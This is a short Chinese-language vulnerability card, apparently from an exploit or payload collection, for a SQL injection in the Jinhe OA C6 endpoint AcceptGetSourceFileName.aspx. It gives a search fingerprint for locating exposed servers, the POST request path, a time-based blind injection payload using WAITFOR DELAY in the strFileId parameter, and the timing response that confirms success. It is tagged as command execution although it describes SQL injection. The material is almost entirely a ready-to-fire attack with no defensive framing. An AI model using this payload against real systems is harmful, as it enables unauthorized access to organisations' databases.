# 金和OAC6AcceptGetSourceFileName.aspx存在SQL注入漏洞

金和OA ｜ 命令执行 ｜ —
- **指纹**：`body="JHSoft.Web.AddMenu"`
- **请求**：`POST /c6/Jhsoft.Web.AcceptAip/AcceptGetSourceFileName.aspx/ HTTP/1.1`

**Payload**
```
strFileId=-1'WAITFOR+DELAY+'0:0:5'--&strAppFlag=-1
```
- **响应特征**：200 响应时间>=5s